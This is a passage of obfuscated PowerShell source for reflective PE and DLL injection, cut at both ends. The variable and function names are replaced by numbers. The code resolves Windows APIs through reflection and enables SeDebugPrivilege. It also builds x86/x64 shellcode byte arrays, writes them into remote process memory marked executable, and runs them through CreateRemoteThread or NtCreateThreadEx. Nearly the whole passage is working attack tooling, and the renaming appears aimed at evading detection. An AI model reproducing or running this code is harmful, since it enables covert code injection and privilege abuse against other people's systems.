		${236} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${238}, ${237})
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value ${236}
		${235} = f53 kernel32.dll GetModuleHandleA
		${234} = f33 @([String]) ([IntPtr])
		${167} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${235}, ${234})
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value ${167}
		${233} = f53 kernel32.dll FreeLibrary
		${232} = f33 @([IntPtr]) ([Bool])
		${231} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${233}, ${232})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value ${231}
		${230} = f53 kernel32.dll OpenProcess
	    ${229} = f33 @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${228} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${230}, ${229})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value ${228}
		${227} = f53 kernel32.dll WaitForSingleObject
	    ${226} = f33 @([IntPtr], [UInt32]) ([UInt32])
	    ${225} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${227}, ${226})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${225}
		${224} = f53 kernel32.dll WriteProcessMemory
        ${223} = f33 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${222} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${224}, ${223})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${222}
		${221} = f53 kernel32.dll ReadProcessMemory
        ${220} = f33 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${219} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${221}, ${220})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${219}
		${218} = f53 kernel32.dll CreateRemoteThread
        ${217} = f33 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${216} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${218}, ${217})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${216}
		${215} = f53 kernel32.dll GetExitCodeThread
        ${214} = f33 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${213} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${215}, ${214})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${213}
		${212} = f53 Advapi32.dll OpenThreadToken
        ${211} = f33 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${210} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${212}, ${211})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${210}
		${209} = f53 kernel32.dll GetCurrentThread
        ${208} = f33 @() ([IntPtr])
        ${207} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${209}, ${208})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${207}
		${206} = f53 Advapi32.dll AdjustTokenPrivileges
        ${205} = f33 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${204} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${206}, ${205})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${204}
		${203} = f53 Advapi32.dll LookupPrivilegeValueA
        ${202} = f33 @([String], [String], [IntPtr]) ([Bool])
        ${201} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${203}, ${202})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${201}
		${200} = f53 Advapi32.dll ImpersonateSelf
        ${199} = f33 @([Int32]) ([Bool])
        ${198} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${200}, ${199})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${198}
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    ${197} = f53 NtDll.dll NtCreateThreadEx
            ${196} = f33 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${195} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${197}, ${196})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${195}
        }
		${194} = f53 Kernel32.dll IsWow64Process
        ${193} = f33 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${192} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${194}, ${193})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${192}
		${191} = f53 Kernel32.dll CreateThread
        ${190} = f33 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${189} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${191}, ${190})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${189}
		${188} = f53 kernel32.dll VirtualFree
		${187} = f33 @([IntPtr])
		${186} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${188}, ${187})
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value ${186}
		return $Win32Functions
	}
	Function f31
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${f26},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${f25}
		)
		[Byte[]]${181} = [BitConverter]::GetBytes(${f26})
		[Byte[]]${180} = [BitConverter]::GetBytes(${f25})
		[Byte[]]${182} = [BitConverter]::GetBytes([UInt64]0)
		if (${181}.Count -eq ${180}.Count)
		{
			${183} = 0
			for (${54} = 0; ${54} -lt ${181}.Count; ${54}++)
			{
				${185} = ${181}[${54}] - ${183}
				if (${185} -lt ${180}[${54}])
				{
					${185} += 256
					${183} = 1
				}
				else
				{
					${183} = 0
				}
				[UInt16]${184} = ${185} - ${180}[${54}]
				${182}[${54}] = ${184} -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		return [BitConverter]::ToInt64(${182}, 0)
	}
	Function f30
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${f26},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${f25}
		)
		[Byte[]]${181} = [BitConverter]::GetBytes(${f26})
		[Byte[]]${180} = [BitConverter]::GetBytes(${f25})
		[Byte[]]${182} = [BitConverter]::GetBytes([UInt64]0)
		if (${181}.Count -eq ${180}.Count)
		{
			${183} = 0
			for (${54} = 0; ${54} -lt ${181}.Count; ${54}++)
			{
				[UInt16]${184} = ${181}[${54}] + ${180}[${54}] + ${183}
				${182}[${54}] = ${184} -band 0x00FF
				if ((${184} -band 0xFF00) -eq 0x100)
				{
					${183} = 1
				}
				else
				{
					${183} = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		return [BitConverter]::ToInt64(${182}, 0)
	}
	Function f51
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${f26},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${f25}
		)
		[Byte[]]${181} = [BitConverter]::GetBytes(${f26})
		[Byte[]]${180} = [BitConverter]::GetBytes(${f25})
		if (${181}.Count -eq ${180}.Count)
		{
			for (${54} = ${181}.Count-1; ${54} -ge 0; ${54}--)
			{
				if (${181}[${54}] -gt ${180}[${54}])
				{
					return $true
				}
				elseif (${181}[${54}] -lt ${180}[${54}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${179} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${179}, 0))
	}
	Function f47
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${f23},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${f4},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${f13},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${f24}
		)
	    [IntPtr]${178} = [IntPtr](f30 (${f13}) (${f24}))
		${43} = ${f4}.EndAddress
		if ((f51 (${f4}.PEHandle) (${f13})) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. ${f23}"
		}
		if ((f51 (${178}) (${43})) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. ${f23}"
		}
	}
	Function f41
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${f21},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${f22}
		)
		for (${177} = 0; ${177} -lt ${f21}.Length; ${177}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${f22}, ${177}, ${f21}[${177}])
		}
	}
	Function f33
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${f19} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${f20} = [Void]
	    )
	    ${176} = [AppDomain]::CurrentDomain
	    ${175} = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    ${174} = ${176}.DefineDynamicAssembly(${175}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${173} = ${174}.DefineDynamicModule('InMemoryModule', $false)
	    ${170} = ${173}.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    ${172} = ${170}.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, ${f19})
	    ${172}.SetImplementationFlags('Runtime, Managed')
	    ${171} = ${170}.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', ${f20}, ${f19})
	    ${171}.SetImplementationFlags('Runtime, Managed')
	    Write-Output ${170}.CreateType()
	}
	Function f53
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${f18},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${f17}
	    )
	    ${169} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    ${168} = ${169}.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    ${167} = ${168}.GetMethod('GetModuleHandle')
	    ${164} = ${168}.GetMethod('GetProcAddress')
	    ${165} = ${167}.Invoke($null, @(${f18}))
	    ${166} = New-Object IntPtr
	    ${163} = New-Object System.Runtime.InteropServices.HandleRef(${166}, ${165})
	    Write-Output ${164}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${163}, ${f17}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${162} = $Win32Functions.GetCurrentThread.Invoke()
		if (${162} -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		[IntPtr]${159} = [IntPtr]::Zero
		[Bool]${32} = $Win32Functions.OpenThreadToken.Invoke(${162}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${159})
		if (${32} -eq $false)
		{
			${157} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${157} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${32} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${32} -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				${32} = $Win32Functions.OpenThreadToken.Invoke(${162}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${159})
				if (${32} -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: ${157}"
			}
		}
		[IntPtr]${161} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${32} = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", ${161})
		if (${32} -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]${158} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${156} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${158})
		${160} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${156}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${160}.PrivilegeCount = 1
		${160}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${161}, [Type]$Win32Types.LUID)
		${160}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${160}, ${156}, $true)
		${32} = $Win32Functions.AdjustTokenPrivileges.Invoke(${159}, $false, ${156}, ${158}, [IntPtr]::Zero, [IntPtr]::Zero)
		${157} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${32} -eq $false) -or (${157} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${156})
	}
	Function f29
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${f16},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${f13},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${f15} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${152} = [IntPtr]::Zero
		${155} = [Environment]::OSVersion.Version
		if ((${155} -ge (New-Object 'Version' 6,0)) -and (${155} -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: ${f13}"
			${154}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${152}, 0x1FFFFF, [IntPtr]::Zero, ${f16}, ${f13}, ${f15}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${153} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${152} -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: ${154}. LastError: ${153}"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: ${f13}"
			${152} = $Win32Functions.CreateRemoteThread.Invoke(${f16}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${f13}, ${f15}, 0, [IntPtr]::Zero)
		}
		if (${152} -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		return ${152}
	}
	Function f52
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${f2},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${146} = New-Object System.Object
		${151} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${f2}, [Type]$Win32Types.IMAGE_DOS_HEADER)
		[IntPtr]${149} = [IntPtr](f30 ([Int64]${f2}) ([Int64][UInt64]${151}.e_lfanew))
		${146} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${149}
		${150} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${149}, [Type]$Win32Types.IMAGE_NT_HEADERS64)
	    if (${150}.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		if (${150}.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			${146} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${150}
			${146} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${148} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${149}, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			${146} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${148}
			${146} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${146}
	}
	Function f46
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${f5},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${f4} = New-Object System.Object
		[IntPtr]${147} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${f5}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${f5}, 0, ${147}, ${f5}.Length) | Out-Null
		${146} = f52 -f2 ${147} -Win32Types $Win32Types
		${f4} | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value (${146}.PE64Bit)
		${f4} | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value (${146}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${f4} | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value (${146}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${f4} | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value (${146}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${f4} | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value (${146}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${147})
		return ${f4}
	}
	Function f34
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${f2},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		if (${f2} -eq $null -or ${f2} -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		${f4} = New-Object System.Object
		${146} = f52 -f2 ${f2} -Win32Types $Win32Types
		${f4} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${f2}
		${f4} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${146}.IMAGE_NT_HEADERS)
		${f4} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${146}.NtHeadersPtr)
		${f4} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${146}.PE64Bit)
		${f4} | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value (${146}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${f4}.PE64Bit -eq $true)
		{
			[IntPtr]${98} = [IntPtr](f30 ([Int64]${f4}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			${f4} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${98}
		}
		else
		{
			[IntPtr]${98} = [IntPtr](f30 ([Int64]${f4}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			${f4} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${98}
		}
		if ((${146}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			${f4} | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif ((${146}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${f4} | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		return ${f4}
	}
	Function f50
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${f3},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${f12}
		)
		${38} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${24} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${f12})
		${145} = [UIntPtr][UInt64]([UInt64]${24}.Length + 1)
		${137} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, ${145}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${137} -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]${34} = [UIntPtr]::Zero
		${4} = $Win32Functions.WriteProcessMemory.Invoke(${f3}, ${137}, ${f12}, ${145}, [Ref]${34})
		if (${4} -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if (${145} -ne ${34})
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		${48} = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		${139} = $Win32Functions.GetProcAddress.Invoke(${48}, "LoadLibraryA") 
		[IntPtr]${136} = [IntPtr]::Zero
		if (${f4}.PE64Bit -eq $true)
		{
			${140} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, ${145}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if (${140} -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			${144} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${143} = @(0x48, 0xba)
			${142} = @(0xff, 0xd2, 0x48, 0xba)
			${141} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${33} = ${144}.Length + ${143}.Length + ${142}.Length + ${141}.Length + (${38} * 3)
			${37} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${33})
			${35} = ${37}
			f41 -f21 ${144} -f22 ${37}
			${37} = f30 ${37} (${144}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${137}, ${37}, $false)
			${37} = f30 ${37} (${38})
			f41 -f21 ${143} -f22 ${37}
			${37} = f30 ${37} (${143}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${139}, ${37}, $false)
			${37} = f30 ${37} (${38})
			f41 -f21 ${142} -f22 ${37}
			${37} = f30 ${37} (${142}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${140}, ${37}, $false)
			${37} = f30 ${37} (${38})
			f41 -f21 ${141} -f22 ${37}
			${37} = f30 ${37} (${141}.Length)
			${31} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, [UIntPtr][UInt64]${33}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${31} -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			${4} = $Win32Functions.WriteProcessMemory.Invoke(${f3}, ${31}, ${35}, [UIntPtr][UInt64]${33}, [Ref]${34})
			if ((${4} -eq $false) -or ([UInt64]${34} -ne [UInt64]${33}))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			${6} = f29 -f16 ${f3} -f13 ${31} -Win32Functions $Win32Functions 
			${32} = $Win32Functions.WaitForSingleObject.Invoke(${6}, 20000)
			if (${32} -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			[IntPtr]${126} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${38})
			${32} = $Win32Functions.ReadProcessMemory.Invoke(${f3}, ${140}, ${126}, [UIntPtr][UInt64]${38}, [Ref]${34})
			if (${32} -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]${136} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${126}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${140}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${31}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${6} = f29 -f16 ${f3} -f13 ${139} -f15 ${137} -Win32Functions $Win32Functions 
			${32} = $Win32Functions.WaitForSingleObject.Invoke(${6}, 20000)
			if (${32} -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			[Int32]${138} = 0
			${32} = $Win32Functions.GetExitCodeThread.Invoke(${6}, [Ref]${138})
			if ((${32} -eq 0) -or (${138} -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			[IntPtr]${136} = [IntPtr]${138}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${137}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${136}
	}
	Function f49
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${f3},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${f14},
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		${f8}
		)
		${38} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${135} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${f8})
		${134} = [UIntPtr][UInt64]([UInt64]${f8}.Length + 1)
		${125} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, ${134}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${125} -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}
		[UIntPtr]${34} = [UIntPtr]::Zero
		${4} = $Win32Functions.WriteProcessMemory.Invoke(${f3}, ${125}, ${135}, ${134}, [Ref]${34})
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${135})
		if (${4} -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if (${134} -ne ${34})
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		${48} = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		${129} = $Win32Functions.GetProcAddress.Invoke(${48}, "GetProcAddress") 
		${124} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, [UInt64][UInt64]${38}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${124} -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		[Byte[]]${133} = @()
		if (${f4}.PE64Bit -eq $true)
		{
			${132} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${131} = @(0x48, 0xba)
			${130} = @(0x48, 0xb8)
			${128} = @(0xff, 0xd0, 0x48, 0xb9)
			${127} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${132} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${131} = @(0xb9)
			${130} = @(0x51, 0x50, 0xb8)
			${128} = @(0xff, 0xd0, 0xb9)
			${127} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${33} = ${132}.Length + ${131}.Length + ${130}.Length + ${128}.Length + ${127}.Length + (${38} * 4)
		${37} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${33})
		${35} = ${37}
		f41 -f21 ${132} -f22 ${37}
		${37} = f30 ${37} (${132}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${f14}, ${37}, $false)
		${37} = f30 ${37} (${38})
		f41 -f21 ${131} -f22 ${37}
		${37} = f30 ${37} (${131}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${125}, ${37}, $false)
		${37} = f30 ${37} (${38})
		f41 -f21 ${130} -f22 ${37}
		${37} = f30 ${37} (${130}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${129}, ${37}, $false)
		${37} = f30 ${37} (${38})
		f41 -f21 ${128} -f22 ${37}
		${37} = f30 ${37} (${128}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${124}, ${37}, $false)
		${37} = f30 ${37} (${38})
		f41 -f21 ${127} -f22 ${37}
		${37} = f30 ${37} (${127}.Length)
		${31} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, [UIntPtr][UInt64]${33}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
